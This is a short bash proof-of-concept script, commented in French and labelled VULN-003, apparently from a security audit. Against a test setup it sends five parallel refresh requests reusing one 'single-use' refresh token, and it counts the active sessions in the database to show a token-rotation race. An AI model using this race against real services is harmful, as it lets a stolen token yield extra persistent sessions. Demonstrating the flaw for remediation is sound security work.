#!/usr/bin/env bash
# VULN-003 — PoC : un refresh token "à usage unique" utilisé plusieurs fois en parallèle
source "$(dirname "$0")/../outils/common.sh"
setup_accounts

REFRESH=$(post /auth/login '{"email":"alice@corp.test","password":"AlicePass123!"}' | field refreshToken)
ALICE_ID=$(sql "SELECT id FROM User WHERE email = 'alice@corp.test';")
echo "=== Alice connectée. Sessions actives en base : $(sql "SELECT count(*) FROM RefreshToken WHERE userId = $ALICE_ID AND revokedAt IS NULL;")"

echo
echo "=== L'attaquant (qui a volé le refresh token) et Alice l'utilisent au même moment, 5 fois"
echo "POST /auth/refresh  {\"refreshToken\":\"<le même token>\"}  x5 en parallèle"
for i in 1 2 3 4 5; do
  curl -s -o /dev/null -w "requête $i -> HTTP %{http_code}\n" -X POST "$BASE/auth/refresh" \
    -H 'Content-Type: application/json' -d "{\"refreshToken\":\"$REFRESH\"}" &
done
wait

echo
echo "=== Sessions actives en base après coup : $(sql "SELECT count(*) FROM RefreshToken WHERE userId = $ALICE_ID AND revokedAt IS NULL;")"
echo "(une rotation correcte n'en laisserait qu'une)"
